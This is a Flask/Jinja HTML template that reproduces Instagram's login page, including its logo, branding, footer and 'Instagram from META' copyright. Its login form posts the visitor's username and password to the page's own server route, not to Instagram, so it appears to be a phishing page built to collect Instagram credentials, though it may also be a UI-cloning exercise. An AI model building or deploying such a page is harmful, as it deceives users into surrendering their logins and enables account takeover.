<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{url_for('static',filename='./style.css')}}" />
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="{{url_for('static',filename='./instagram-logo.png')}}" alt="Instagram logo" title="Instagram logo" />
                </h1>


                <form action="{{ url_for('users') }}" method="post">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input type="text" name="username" placeholder="Phone, username, or email" required/>
                
                    <label for="password" class="sr-only">Password</label>
                    <input name="password" type="password" placeholder="Password" required />
                
                    <button type="submit">Log In</button>
                </form>
                

                
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Login with Facebook</a>
                    </div>
                    <a href="#">Forgot your password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign Up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="{{url_for('static',filename='./apple-button.png')}}" alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />

                    <img src="{{url_for('static',filename='./googleplay-button.png')}}" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">TOP ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">Â© 2023 Instagram from META</p>
    </footer>
    <script src="{{url_for('static',filename='scripts.js')}}"></script>
</body>

</html>
